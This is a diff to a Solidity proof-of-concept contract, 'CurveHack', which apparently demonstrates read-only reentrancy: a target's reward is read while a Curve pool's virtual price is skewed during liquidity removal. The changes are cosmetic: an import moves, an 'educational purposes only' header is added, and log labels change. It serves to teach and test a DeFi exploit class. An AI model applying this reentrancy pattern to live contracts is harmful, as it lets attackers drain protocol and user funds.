@@ -1,13 +1,19 @@
 //SPDX-License-Identifier: UNLICENDED
 pragma solidity 0.8.21;
 
+import {console2} from "forge-std/Test.sol";
 import {ICurve} from "./interfaces/ICurve.sol";
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
 import {Constants} from "./Constants.sol";
-import {console2} from "forge-std/Test.sol";
 import {Target} from "./Target.sol";
 
+ /**
+  * @title  CurveHack Contract
+  * @author cartlex
+  * @notice This contract is for educational purposes only,
+  *         do not use it in production.
+  */
 contract CurveHack is Constants {
     using SafeERC20 for IERC20;
 
@@ -23,7 +29,7 @@ contract CurveHack is Constants {
         // get virtual price
         console2.log("during removing LP - virtual price", POOL.get_virtual_price());
         uint256 reward = target.getReward();
-        console2.log("reward", reward);
+        console2.log("reward with read-only reentancy", reward);
     }
 
     function setup() external payable {
@@ -46,6 +52,6 @@ contract CurveHack is Constants {
         POOL.remove_liquidity(lp, min_amounts);
 
         uint256 reward = target.getReward();
-        console2.log("reward", reward);
+        console2.log("reward without read-only reentrancy", reward);
     }
 }
